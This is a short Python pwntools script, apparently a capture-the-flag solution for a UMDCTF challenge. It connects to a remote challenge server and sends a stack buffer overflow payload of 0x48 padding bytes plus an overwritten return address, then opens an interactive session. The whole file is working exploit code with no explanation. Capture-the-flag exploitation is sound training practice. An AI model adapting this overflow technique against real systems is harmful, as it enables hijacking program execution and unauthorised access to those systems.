from pwn import *

p = remote("chals5.umdctf.io", 7003)

payload = b"A"*0x48
payload += p64(0x40125d)
p.send(payload)

p.interactive()